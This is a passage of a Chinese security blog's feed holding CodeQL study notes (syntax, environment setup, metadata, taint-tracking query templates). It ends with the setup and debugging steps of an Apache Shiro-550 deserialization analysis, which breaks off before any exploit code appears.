class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">and</span><br><span class="line">any</span><br><span class="line">as</span><br><span class="line">asc</span><br><span class="line">avg</span><br><span class="line">boolean</span><br><span class="line">by</span><br><span class="line">class</span><br><span class="line">concat</span><br><span class="line">count</span><br><span class="line">date</span><br><span class="line">desc</span><br><span class="line">else</span><br><span class="line">exists</span><br><span class="line">extends</span><br><span class="line">false</span><br><span class="line">float</span><br><span class="line">forall</span><br><span class="line">forex</span><br><span class="line">from</span><br><span class="line">if</span><br><span class="line">implies</span><br><span class="line">import</span><br><span class="line">in</span><br><span class="line">instanceof</span><br><span class="line">int</span><br><span class="line">max</span><br><span class="line">min</span><br><span class="line">module</span><br><span class="line">newtype</span><br><span class="line">none</span><br><span class="line">not</span><br><span class="line">or</span><br><span class="line">order</span><br><span class="line">predicate</span><br><span class="line">rank</span><br><span class="line">result</span><br><span class="line">select</span><br><span class="line">strictconcat</span><br><span class="line">strictcount</span><br><span class="line">strictsum</span><br><span class="line">string</span><br><span class="line">sum</span><br><span class="line">super</span><br><span class="line">then</span><br><span class="line">this</span><br><span class="line">true</span><br><span class="line">unique</span><br><span class="line">where</span><br></pre></td></tr></table></figure><h3 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">annotations ::= annotation*</span><br><span class="line"></span><br><span class="line">annotation ::= simpleAnnotation | argsAnnotation</span><br><span class="line"></span><br><span class="line">simpleAnnotation ::= "abstract"</span><br><span class="line">                 |   "cached"</span><br><span class="line">                 |   "external"</span><br><span class="line">                 |   "final"</span><br><span class="line">                 |   "transient"</span><br><span class="line">                 |   "library"</span><br><span class="line">                 |   "private"</span><br><span class="line">                 |   "deprecated"</span><br><span class="line">                 |   "override"</span><br><span class="line">                 |   "query"</span><br><span class="line"></span><br><span class="line">argsAnnotation ::= "pragma" "[" ("inline" | "noinline" | "nomagic" | "noopt") "]"</span><br><span class="line">               |   "language" "[" "monotonicAggregates" "]"</span><br><span class="line">               |   "bindingset" "[" (variable ( "," variable)*)? "]"</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211029120929628.png" alt="image-20211029120929628" style="zoom:50%;"><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211029120939113.png" alt="image-20211029120939113" style="zoom:50%;"><h3 id="Built-in内置"><a href="#Built-in内置" class="headerlink" title="Built-in内置"></a>Built-in内置</h3><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211029121432146.png" alt="image-20211029121432146" style="zoom:50%;"><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211029121416854.png" alt="image-20211029121416854" style="zoom:50%;"><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211029121447367.png" alt="image-20211029121447367" style="zoom:50%;"><p><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins-for-float" target="_blank" rel="noopener">built-ins-for-float</a></p><p><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins-for-int" target="_blank" rel="noopener">built-ins-for-int</a></p><p><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins-for-string" target="_blank" rel="noopener">built-ins-for string</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;倚杖柴门外，临门听暮蝉。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;学习CodeQL查询语法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/categories/CodeQL/"/>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL学习笔记(一)</title>
    <link href="https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
    <id>https://fynch3r.github.io/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</id>
    <published>2021-10-21T08:58:57.000Z</published>
    <updated>2022-03-04T10:23:05.103Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>杨柳散和风，青山澹吾虑。</p></blockquote><p>CodeQL搭建环境，初步上手。</p><a id="more"></a><h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p><a href="https://semmle.com/" target="_blank" rel="noopener">Semmle</a>公司最早独创性的开创了一种QL语言，Semmle QL，并且运行在自家LGTM平台上。</p><p>LGTM平台上存放的就是一些开源项目，用户可以选择分析的语言，编写ql语句进行程序安全性查询。</p><p>2019年，GitHub（背后是微软）收购了Semmle公司，开源了<a href="https://github.com/github/codeql" target="_blank" rel="noopener">CodeQL</a>分析引擎。</p><h1 id="CodeQL-引擎"><a href="#CodeQL-引擎" class="headerlink" title="CodeQL 引擎"></a>CodeQL 引擎</h1><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211021182151966.png" alt="image-20211021182151966" style="zoom:50%;"><p>CodeQL引擎：</p><ul><li><p>将源码通过Extractor模块进行代码信息分析&amp;提取，构建一套自己的关系型数据库Snapshot Database。</p><p>编译型语言：Extractor观察编译器的编译过程，捕获编译器生成的AST，语义信息(名称绑定、类型信息、运算操作等)，控制流，数据流信息，外加一份源码。</p><p>解释型语言：Extractor直接分析源代码。</p></li><li><p>Snapshot Database里面包括：源代码，关系数据。</p></li><li><p>接下来用户输入QL语句，经过CodeQL的工具库转换为Compiled Query，参与查询。</p></li><li><p>最终展示查询结果。</p></li></ul><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20220304182303012.png" alt="image-20220304182303012" style="zoom:50%;"><p>Extractor做了哪些事情？</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211026141929462.png" alt="image-20211026141929462" style="zoom:50%;"><p>如图所示：</p><ol><li>对于待分析的源代码，首先Copy一份，用于后续保留。</li><li>将源码转换为关系型数据，也就是trap文件，放在database里面（比如，每个Java文件可以生成一个trap文件）。</li><li>上面二者(Copy + Database)构建为snapshot快照。</li></ol><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>CodeQL CLI来作为工具库 VSCode作为查询前端</p><h2 id="CodeQL-CLI-binaries"><a href="#CodeQL-CLI-binaries" class="headerlink" title="CodeQL-CLI-binaries"></a>CodeQL-CLI-binaries</h2><p>文本命令行工具</p><p>下载地址：<a href="https://github.com/github/codeql-cli-binaries" target="_blank" rel="noopener">https://github.com/github/codeql-cli-binaries</a> MacOS直接下载osx版本</p><p>配置环境变量</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211021210656167.png" alt="image-20211021210656167" style="zoom:50%;"><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211021210555887.png" alt="image-20211021210555887" style="zoom:50%;"><p>把$CODEQL放在插件中：</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211022114854132.png" alt="image-20211022114854132" style="zoom:50%;"><h2 id="CodeQL-Library"><a href="#CodeQL-Library" class="headerlink" title="CodeQL Library"></a>CodeQL Library</h2><p>CodeQL Query 查询工具库，负责编译QL语言，必不可少。</p><p>下载地址：<a href="https://github.com/github/codeql" target="_blank" rel="noopener">https://github.com/github/codeql</a> </p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211021210535079.png" alt="image-20211021210535079" style="zoom:50%;"><p>codeql-lib文件夹下存放的是各个语言的若干QL模块(qll文件)，模块中有若干class可以用来match语言的若干case，这些class可以分为四种类型：</p><ul><li>语法型</li><li>控制流型</li><li>类型推断型</li><li>污点跟踪型</li></ul><h1 id="源码准备"><a href="#源码准备" class="headerlink" title="源码准备"></a>源码准备</h1><p>参考<a href="https://www.yuque.com/docs/share/738555ae-258e-4f27-8818-6024b8225488?#" target="_blank" rel="noopener">楼兰师傅</a>，自己本地follow一遍</p><h2 id="下载待分析的源码"><a href="#下载待分析的源码" class="headerlink" title="下载待分析的源码"></a>下载待分析的源码</h2><p>选择WebGoat，jdk8版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --branch v8.0.0 https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure><h2 id="构建数据库"><a href="#构建数据库" class="headerlink" title="构建数据库"></a>构建数据库</h2><p>到这里，codeql已经是一个命令行工具了，你可以随时在终端里调用它。</p><p>在WebGoat根目录下，创建数据库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd WebGoat</span><br><span class="line">codeql database create webgoat-qldb -l java</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211022113654741.png" alt="image-20211022113654741" style="zoom:50%;"><p>构建之后的数据库：</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211022114145300.png" alt="image-20211022114145300" style="zoom:50%;"><h2 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h2><h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><p>将上一步生成的webgoatqldb加载到vscode中，From a folder</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211022160542029.png" alt="image-20211022160542029" style="zoom:50%;"><h3 id="配置QL-Pack"><a href="#配置QL-Pack" class="headerlink" title="配置QL Pack"></a>配置QL Pack</h3><blockquote><p>QL packs organize the files used in CodeQL analysis and can store queries, library files, query suites, and important metadata. Their root directory must contain a file named qlpack.yml. Your custom queries should be saved in the QL pack root, or its subdirectories.</p></blockquote><p>按照官方文档来，新建一个文件夹codeql-query（存放配置文件和查询语句），表示一个QL查询包，编写配置文件alpack.yml：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">example-query</span> <span class="comment"># 包名 确保唯一性 必写</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.0</span> <span class="comment"># 版本号 必写</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-java</span> <span class="comment"># 依赖 必写</span></span><br></pre></td></tr></table></figure><h3 id="添加到工作区"><a href="#添加到工作区" class="headerlink" title="添加到工作区"></a>添加到工作区</h3><p>Add folder to workspace，保证codeql-home，codeql-query包添加到工作区：</p><h1 id="QL查询"><a href="#QL查询" class="headerlink" title="QL查询"></a>QL查询</h1><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20211022160948714.png" alt="image-20211022160948714" style="zoom:50%;"><p>编写QL脚本之后，直接右键-&gt;Code：Run Query；</p><p>图中为查询所有method，右侧为查询到的结果，点击既可查看对应的src源码。</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>vscode插件中，页面上右键点击会出现：</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20220105170008407.png" alt="image-20220105170008407" style="zoom:50%;"><p>区别：</p><ul><li>CodeQL: Run Query  ql整体查询（最常用）</li><li>CodeQL: Quick Evaluation 只查询鼠标选中的谓词/片段</li><li>CodeQL: Run Query on Multiple Databases 在多个数据中联合查询</li></ul><h1 id="CodeQL-queries"><a href="#CodeQL-queries" class="headerlink" title="CodeQL queries"></a>CodeQL queries</h1><p>重要的查找类型有：</p><ul><li><strong>Alert queries</strong>: queries that highlight issues in specific locations in your code.</li><li><strong>Path queries</strong>: queries that describe the flow of information between a source and a sink in your code.</li></ul><p>查询方式：</p><blockquote><p>You can add custom queries to <a href="https://codeql.github.com/docs/codeql-cli/about-ql-packs/" target="_blank" rel="noopener">QL packs</a> to analyze your projects with “<a href="https://docs.github.com/github/finding-security-vulnerabilities-and-errors-in-your-code" target="_blank" rel="noopener">Code scanning</a>”, use them to analyze a database with the “<a href="https://codeql.github.com/docs/codeql-cli/#codeql-cli" target="_blank" rel="noopener">CodeQL CLI</a>,” or you can contribute to the standard CodeQL queries in our <a href="https://github.com/github/codeql" target="_blank" rel="noopener">open source repository on GitHub</a>.</p></blockquote><h2 id="元数据-Metadata"><a href="#元数据-Metadata" class="headerlink" title="元数据 Metadata"></a>元数据 Metadata</h2><p>元数据表示查询的目的、如何解释查询结果、如何显示查询结果。</p><p>不同的查询方式所需的元数据也不相同。</p><ol><li><p>如果你是向GitHub仓库贡献一个查询，学习<a href="https://github.com/github/codeql/blob/main/docs/query-metadata-style-guide.md" target="_blank" rel="noopener">query metadata style guide</a>.</p></li><li><p>如果你正在将自定义查询添加到使用 LGTM 进行分析的qlpack中，学习<a href="https://lgtm.com/help/lgtm/writing-custom-queries" target="_blank" rel="noopener">Writing custom queries to include in LGTM analysis</a>.</p></li><li><p>如果你使用 <a href="https://codeql.github.com/docs/codeql-cli/#codeql-cli" target="_blank" rel="noopener">CodeQL CLI</a>进行查询，你的元数据部分<strong>必须包含</strong> <code>@kind</code>.</p></li><li><p>如果你使用LGTM终端或者VSCode插件进行查询，元数据不是必须的；</p><p>但是如果你希望你的结果显示为<code>alert</code> 或者<code>path</code>，必须包含<code>@kind</code>. 更多内容学习 “<a href="https://codeql.github.com/docs/codeql-for-visual-studio-code/analyzing-your-projects/#analyzing-your-projects" target="_blank" rel="noopener">Analyzing your projects</a>”</p><p>Alert problem：必须包含<code>@kind problem</code></p><p>Path problem：必须包含<code>@kind path-problem</code></p></li></ol><h2 id="元数据属性"><a href="#元数据属性" class="headerlink" title="元数据属性"></a>元数据属性</h2><p>更细的学习：<a href="https://github.com/github/codeql/blob/main/docs/query-metadata-style-guide.md" target="_blank" rel="noopener">Query metadata style guide</a>.</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td><code>@description</code></td><td><code>&lt;text&gt;</code></td><td>描述查询的用途，代码元素用 <code>&#39;</code>框住</td></tr><tr><td><code>@id</code></td><td><code>&lt;text&gt;</code></td><td>识别和分类查询，使用<code>/</code>和<code>-</code>分割；LGTM模板：<code>&lt;language&gt;/&lt;brief-description&gt;</code></td></tr><tr><td><code>@kind</code></td><td><code>problem</code> <code>path-problem</code></td><td>the query is an alert (<code>@kind problem</code>) or a path (<code>@kind path-problem</code>)</td></tr><tr><td><code>@name</code></td><td><code>&lt;text&gt;</code></td><td>查询的名字，代码元素用 <code>&#39;</code>框住</td></tr><tr><td><code>@tags</code></td><td><code>correctness</code> <code>maintainability</code> <code>readability</code> <code>security</code></td><td>查询的归类</td></tr><tr><td><code>@precision</code></td><td><code>low</code> <code>medium</code> <code>high</code> <code>very-high</code></td><td>查询的准确率（误报率高低）</td></tr><tr><td><code>@problem.severity</code></td><td><code>error</code> <code>warning</code> <code>recommendation</code></td><td>描述一次非安全查询的产生的任何警报的严重性等级</td></tr><tr><td><code>@security-severity</code></td><td><code>&lt;score&gt;</code></td><td>漏洞评分</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>备注：</p><ol><li><p>tags</p><blockquote><ul><li><code>@tags correctness</code>–for queries that 检测程序不正确的行为.</li><li><code>@tags maintainability</code>–for queries that 检测程序中难以改动的模式.</li><li><code>@tags readability</code>–for queries that 检测程序中源码难以阅读的模式.</li><li><code>@tags security</code>–for queries that 检测程序中的安全性问题.</li></ul></blockquote></li></ol><p>官方规范小例子：</p><p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20220107101109715.png" alt="image-20220107101109715"></p><h2 id="规范查询结果"><a href="#规范查询结果" class="headerlink" title="规范查询结果"></a>规范查询结果</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select f, "This file is similar to $@.", other, other.getBaseName()</span><br></pre></td></tr></table></figure><p><code>$@</code> 会把后两列合并显示</p><h2 id="关于数据流分析"><a href="#关于数据流分析" class="headerlink" title="关于数据流分析"></a>关于数据流分析</h2><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><p>AST上面的节点是语句/表达式 Expr Stmt</p><p>数据流图上的节点是传递value的语义元素 ExprNode ParameterNode</p><blockquote><p>Some AST nodes (such as expressions) have corresponding data flow nodes, but others (such as <code>if</code> statements) do not. This is because expressions are evaluated to a value at runtime, whereas <code>if</code> statements are purely a control-flow construct and do not carry values. There are also data flow nodes that do not correspond to AST nodes at all.</p></blockquote><p>AST上面的节点：Stmt，Expr</p><p>Expr有对应的数据流图节点，因为表达式在数据流分析过程中变成了value</p><p>Stmt没有对应的数据流图节点，比如if，纯纯的控制流结构，不携带任何值</p><p>当然，数据流图还有很多节点中根本没在抽象语法树中出现；</p><h3 id="建模"><a href="#建模" class="headerlink" title="建模"></a>建模</h3><p>两种：</p><ul><li>local data flow ：局部数据流分析，函数内</li><li>Global data flow：全局数据流分析，函数间</li></ul><h3 id="数据流分析-污点分析"><a href="#数据流分析-污点分析" class="headerlink" title="数据流分析+污点分析"></a>数据流分析+污点分析</h3><blockquote><p>For example, if you are tracking an insecure object <code>x</code> (which might be some untrusted or potentially malicious data), a step in the program may ‘change’ its value. So, in a simple process such as <code>y = x + 1</code>, a normal data flow analysis will highlight the use of <code>x</code>, but not <code>y</code>. However, since <code>y</code> is derived from <code>x</code>, it is influenced by the untrusted or ‘tainted’ information, and therefore it is also tainted. Analyzing the flow of the taint from <code>x</code> to <code>y</code> is known as taint tracking.</p></blockquote><h2 id="关于路径查询"><a href="#关于路径查询" class="headerlink" title="关于路径查询"></a>关于路径查询</h2><p>官方模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * ...</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * ...</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import &lt;language&gt;</span><br><span class="line">&#x2F;&#x2F; For some languages (Java&#x2F;C++&#x2F;Python) you need to explicitly import the data flow library, such as</span><br><span class="line">&#x2F;&#x2F; import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">from MyConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;&lt;message&gt;&quot;</span><br></pre></td></tr></table></figure><p>import DataFlow::PathGraph</p><p>PathGraph有内置查询谓词edges，用来判断ab之间是否有数据边，有的话找出来</p><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/image-20220107111253978.png" alt="image-20220107111253978" style="zoom:50%;"><h2 id="数据流分析调试"><a href="#数据流分析调试" class="headerlink" title="数据流分析调试"></a>数据流分析调试</h2><p>常规模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class MyConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyConfig() &#123; this &#x3D; &quot;MyConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node node) &#123; node instanceof MySource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node node) &#123; node instanceof MySink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from MyConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;Sink is reached from $@.&quot;, source.getNode(), &quot;here&quot;</span><br></pre></td></tr></table></figure><h3 id="检查Source和Sink集合"><a href="#检查Source和Sink集合" class="headerlink" title="检查Source和Sink集合"></a>检查Source和Sink集合</h3><p>选中<code>node instanceof MySource</code>,右键“CodeQL: Quick Evaluation”，可以查看你的SourceSet</p><h3 id="设置fieldFlowBranchLimit属性值"><a href="#设置fieldFlowBranchLimit属性值" class="headerlink" title="设置fieldFlowBranchLimit属性值"></a>设置<code>fieldFlowBranchLimit</code>属性值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override int fieldFlowBranchLimit() &#123; result &#x3D; 5000 &#125;</span><br></pre></td></tr></table></figure><p>Data-flow configuration们自身有个属性：<code>fieldFlowBranchLimit</code></p><p>他的value如果过高会浪费性能，过低找不到path；</p><h3 id="部分数据流"><a href="#部分数据流" class="headerlink" title="部分数据流"></a>部分数据流</h3><p>“数据流片段”</p><p>如果你想获取全部的“数据流片段”，naive的做法可能是两步：</p><ul><li>传统的hasFlow</li><li>isSink =&gt; any()</li></ul><p>但是这样是找不到全部的数据流片段的，因为CodeQL内置的数据流库其实一直在努力修建不可能的路径。</p><p>官方推荐谓词：<code>Configuration.hasPartialFlow</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final predicate hasPartialFlow(PartialPathNode source, PartialPathNode node, int dist) &#123;&#125;</span><br></pre></td></tr></table></figure><p>用法：<a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/internal/DataFlowImpl2.qll/predicate.DataFlowImpl2$Configuration$hasPartialFlow.3.html" target="_blank" rel="noopener">Configuration.hasPartialFlow</a></p><p>需要先设置explorationLimit，它是整个搜索范围的Top，dist应该&lt;=：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override int explorationLimit() &#123; result = 5 &#125;</span><br></pre></td></tr></table></figure><p>推荐的方式是直接写一个谓词来包装它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">predicate adhocPartialFlow(Callable c, PartialPathNode n, Node src, int dist) &#123;</span><br><span class="line">  exists(MyConfig conf, PartialPathNode source |</span><br><span class="line">    conf.hasPartialFlow(source, n, dist) and</span><br><span class="line">    src = source.getNode() and</span><br><span class="line">    c = n.getNode().getEnclosingCallable()</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;杨柳散和风，青山澹吾虑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CodeQL搭建环境，初步上手。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/categories/CodeQL/"/>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞分析</title>
    <link href="https://fynch3r.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://fynch3r.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-09-09T11:28:28.000Z</published>
    <updated>2022-03-01T10:54:39.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>填Shiro的坑。</p><a id="more"></a><h1 id="Apache-Shiro-简介"><a href="#Apache-Shiro-简介" class="headerlink" title="Apache Shiro 简介"></a>Apache Shiro 简介</h1><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。Shiro的优势在于轻量级，使用简单、上手更快、学习成本低。</p><h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><p>特征：返回包中包含rememberMe=deleteMe字段。</p><p>影响版本：shiro&lt;1.2.24</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p>打开samples/web文件，这个是带jsp界面的，待会儿审计的类存放在pom依赖中，maven会帮助我们去找的</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018162539922.png" alt="image-20211018162539922"></p><p>修改一下pom.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有时候IDEA会自动识别facets，没有的话自己去找web.xml手动配一下，</p><p>首先为项目生成artifacts，最后不要忘记配置artifact：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909194117777.png" alt="image-20210909194117777"></p><p>成功：</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909194253598.png" alt="image-20210909194253598"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">官方提示</a>在<code>CookieRememberMeManager</code>类中</p><p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910135738607.png" alt="image-20210910135738607"></p><p>可以看出一对对称函数（shiro-core的jar包中）：</p><p><img 